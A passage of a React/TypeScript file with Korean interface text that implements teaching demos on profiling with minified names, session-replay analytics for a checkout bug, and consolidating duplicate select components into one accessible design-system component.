  { min: '(anonymous)', minAt: 'index-B3x9kq.js:1:48402', name: 'new Intl.NumberFormat', at: 'money.ts:13 (셀마다 새로 만듦)', ms: 380, depth: 3, x: 0 },
  { min: 'Nr', minAt: 'index-B3x9kq.js:1:51077', name: 'sortByDate', at: 'sort.ts:5', ms: 110, depth: 1, x: 470 },
  { min: 'o', minAt: 'index-B3x9kq.js:1:9930', name: 'Row', at: 'OrderRow.tsx:7', ms: 60, depth: 1, x: 580 },
]
export function MinifyDemo({ fixed }: { fixed: boolean }) {
  const [pick, setPick] = useState<number | null>(null)
  const [rec, setRec] = useState(false)
  const timers = useTimers()
  const record = () => { setRec(false); setPick(null); timers.set(() => setRec(true), 500) }
  const top = PROFILE[3]
  const label = (f: Fn) => fixed ? f.name : f.min
  const sel = pick === null ? null : PROFILE[pick]
  return (
    <div className="dg-col">
      <div className="dv-row"><button type="button" className="btn sm" onClick={record}>주문 표 정렬 · 프로파일 기록</button>{!rec && <span className="dv-log">눌러서 기록해 보세요</span>}</div>
      <div className="dg-flame" aria-label="프로파일 플레임 차트">
        {rec && PROFILE.map((f, i) => (
          <button type="button" key={i} className={'dg-fbar' + (i === 3 ? ' hot' : '') + (pick === i ? ' on' : '')} onClick={() => setPick(i)}
            style={{ left: `${(f.x / 640) * 100}%`, width: `${(f.ms / 640) * 100}%`, top: f.depth * 30 }}>{label(f)}</button>
        ))}
      </div>
      <div className="dg-detail">
        {sel ? <><b>{label(sel)}</b> · {fmt(sel.ms)}ms · <code>{fixed ? sel.at : sel.minAt}</code></> : rec ? '막대를 눌러 보세요 (빨간 막대가 가장 오래 걸려요)' : ' '}
      </div>
      <div className="dv-meters">
        <Meter label="알아볼 수 있는 함수 이름" value={rec ? (fixed ? '6 / 6' : '0 / 6') : '—'} bad={rec ? !fixed : undefined} />
        <Meter label="가장 오래 걸린 곳" value={rec ? (fixed ? top.at.split(' ')[0] : top.minAt) : '—'} bad={rec ? !fixed : undefined} />
      </div>
    </div>
  )
}

/* ---------- 09 행동 분석 ---------- */
type Ev = { t: string; name: string; detail: string; tone?: 'bad' | 'warn' }
const EVENTS: Ev[] = [
  { t: '14:02:10', name: 'page_view', detail: 'cart · iOS Safari 17 · 앱 v3.8.1' },
  { t: '14:02:31', name: 'checkout_start', detail: '상품 2개 · 48,900원' },
  { t: '14:02:58', name: 'coupon_apply', detail: 'code=AUTUMN10' },
  { t: '14:02:59', name: 'error', detail: 'COUPON_EXPIRED (Sentry #4821) · 토스트가 키보드 뒤에 가려짐', tone: 'bad' },
  { t: '14:03:04', name: 'rage_click', detail: '결제하기 버튼 6번 · disabled 상태', tone: 'warn' },
  { t: '14:03:40', name: 'session_end', detail: '결제 없이 이탈' },
]
export function AnalyticsDemo({ fixed }: { fixed: boolean }) {
  const [step, setStep] = useState(-1)
  const [tries, setTries] = useState(0)
  const timers = useTimers()
  const play = () => { timers.clear(); setStep(0); EVENTS.forEach((_, i) => timers.set(() => setStep(i), 600 * i)) }
  const clues = EVENTS.slice(0, step + 1).filter(e => e.tone).length + (step >= 0 ? 1 : 0)
  return (
    <div className="dg-col">
      <div className="dg-ticket"><b>CS 문의 #2291</b><p>“결제 화면에서 안 넘어가요. 몇 번을 눌러도 그대로예요.” — 고객 이**</p></div>
      {!fixed ? (
        <>
          <div className="dg-term small">
            <div className="dg-tl dim">개발자가 볼 수 있는 것</div>
            <div className="dg-tl">서버 로그: POST /orders 기록 없음</div>
            <div className="dg-tl">기기·버전·시각: 알 수 없음</div>
            {tries > 0 && <div className="dg-tl warn">재현 시도 {tries}번: 내 폰에선 잘 넘어가요</div>}
          </div>
          <div className="dv-row"><button type="button" className="btn sm ghost" onClick={() => setTries(t => t + 1)}>내 폰으로 재현해 보기</button></div>
        </>
      ) : (
        <>
          <div className="dg-replay">
            <div className="dg-rp-phone">
              <div className="dg-rp-row"><span>받는 분</span><i>●●●</i></div>
              <div className="dg-rp-row"><span>연락처</span><i>010-●●●●-●●●●</i></div>
              <div className="dg-rp-row"><span>쿠폰</span><em>AUTUMN10</em></div>
              <div className={'dg-rp-btn' + (step >= 3 ? ' off' : '')}>결제하기{step >= 4 && <b className="dg-rp-tap">×6</b>}</div>
              {step >= 3 && <div className="dg-rp-kb">키보드</div>}
            </div>
            <ol className="dg-evs">
              {EVENTS.map((e, i) => <li key={i} className={(i <= step ? 'on ' : '') + (e.tone ?? '')}><time>{e.t}</time><b>{e.name}</b><span>{e.detail}</span></li>)}
            </ol>
          </div>
          <div className="dv-row"><button type="button" className="btn sm" onClick={play}>세션 다시 보기</button><span className="dv-log">입력값은 녹화 단계에서 가려요</span></div>
        </>
      )}
      <div className="dv-meters">
        <Meter label="원인 단서" value={fixed ? `${clues}개` : '0개'} bad={!fixed} />
        <Meter label="재현 시도" value={fixed ? (step >= 0 ? '필요 없음' : '—') : `${tries}번 · 실패`} bad={!fixed && tries > 0} />
        {fixed && <Meter label="녹화에서 가린 개인정보" value="2칸" bad={false} />}
      </div>
    </div>
  )
}

/* ---------- 10 같은 컴포넌트 중복 ---------- */
const OPTS = ['최신순', '낮은 가격순', '높은 가격순', '리뷰 많은순']
function SelectBox({ options, value, onChange }: { options: string[]; value: string; onChange: (v: string) => void }) {
  return <select className="dg-dup a" value={value} onChange={e => onChange(e.target.value)} aria-label="정렬 (SelectBox)">{options.map(o => <option key={o}>{o}</option>)}</select>
}
function Dropdown({ items, selected, onSelect }: { items: string[]; selected: string; onSelect: (v: string) => void }) {
  const [open, setOpen] = useState(false)
  // ✕ div 로 만든 목록 — 키보드로는 열 수도 고를 수도 없어요
  return (
    <div className="dg-dup b" onClick={() => setOpen(o => !o)}>
      {selected}<span>▾</span>
      {open && <div className="dg-dd-list">{items.map(i => <div key={i} onClick={() => onSelect(i)}>{i}</div>)}</div>}
    </div>
  )
}
function Picker({ list, current, onPick }: { list: string[]; current: string; onPick: (v: string) => void }) {
  return <div className="dg-dup c">{list.map(o => <button type="button" key={o} className={o === current ? 'on' : ''} onClick={() => onPick(o)}>{o}</button>)}</div>
}
/** ✓ 디자인 시스템의 Select 하나 */
function Select({ label, options, value, onChange }: { label: string; options: string[]; value: string; onChange: (v: string) => void }) {
  return <label className="dg-ds"><span>{label}</span><select value={value} onChange={e => onChange(e.target.value)}>{options.map(o => <option key={o}>{o}</option>)}</select></label>
}
export function NamingDemo({ fixed }: { fixed: boolean }) {
  const [a, setA] = useState(OPTS[0]), [b, setB] = useState(OPTS[0]), [c, setC] = useState(OPTS[0])
  return (
    <div className="dg-col">
      {!fixed ? (
        <div className="dg-pages">
          <div><small>상품 목록 · SelectBox</small><SelectBox options={OPTS} value={a} onChange={setA} /></div>
          <div><small>검색 결과 · Dropdown</small><Dropdown items={OPTS} selected={b} onSelect={setB} /></div>
          <div><small>찜 목록 · Picker</small><Picker list={OPTS} current={c} onPick={setC} /></div>
        </div>
      ) : (
        <>
          <div className="dg-pages">
            <div><small>상품 목록</small><Select label="정렬" options={OPTS} value={a} onChange={setA} /></div>
            <div><small>검색 결과</small><Select label="정렬" options={OPTS} value={b} onChange={setB} /></div>
            <div><small>찜 목록</small><Select label="정렬" options={OPTS} value={c} onChange={setC} /></div>
          </div>
          <table className="dg-inv">
            <thead><tr><th>컴포넌트</th><th>언제 써요</th></tr></thead>
            <tbody>
              <tr><td><code>Select</code></td><td>목록에서 하나 고르기</td></tr>
              <tr><td><code>Combobox</code></td><td>목록이 길어서 검색이 필요할 때</td></tr>
              <tr><td><code>SegmentedControl</code></td><td>2~4개를 늘 보여 줄 때</td></tr>
            </tbody>
          </table>
        </>
      )}
      <div className="dv-meters">
        <Meter label="같은 역할 컴포넌트" value={fixed ? '1개' : '3개'} bad={!fixed} />
        <Meter label="prop 이름 종류" value={fixed ? 'options · value · onChange' : '3벌'} bad={!fixed} />
        <Meter label="키보드로 고르기" value={fixed ? '3 / 3' : '2 / 3'} bad={!fixed} />
      </div>
      {!fixed && <p className="dv-log">같은 ‘정렬 고르기’인데 높이·모양·prop 이름(options / items / list)이 다 달라요. 가운데 Dropdown은 Tab으로 갈 수 없어요.</p>}
    </div>
  )
}
